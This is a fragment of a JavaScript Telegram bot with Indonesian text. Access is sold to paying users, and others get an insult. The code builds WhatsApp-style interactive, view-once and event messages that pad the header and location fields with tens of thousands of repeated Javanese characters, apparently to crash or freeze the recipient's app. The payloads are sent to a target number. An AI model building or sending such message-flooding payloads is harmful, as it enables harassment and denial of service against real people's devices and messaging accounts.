...
`;
    ...
    const keyboardMain = Markup.inlineKeyboard([
        ...
        [
            ...
            Markup.button.url('Developer ϟ Apps', 'https://t.me/XtrolCome')
        ]
    ]);
...
bot.command("CreateAccount", async (ctx) => {
  ...
  // 2. Validasi Akses
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("😹—Lu siapa tolol, Buy Account Only @XtrolCome");
  }
  ...
  try {
    ...
    const keyboard = {
      reply_markup: {
        inline_keyboard: [[{ text: "! Chanel ☇ Apps", url: "https://t.me/XtrolCome" }]]
      }
    };
    ...
    const content = {
      viewOnceMessage: {
        message: {
          ...
          interactiveMessage: {
            header: { title: "Gransdarknet" + "ꦽ".repeat(10000)+".com" },
    ...
    number,
    {
      ...
      eventMessage: {
        ...
        location: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: "Good Is AldzX505" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
        },
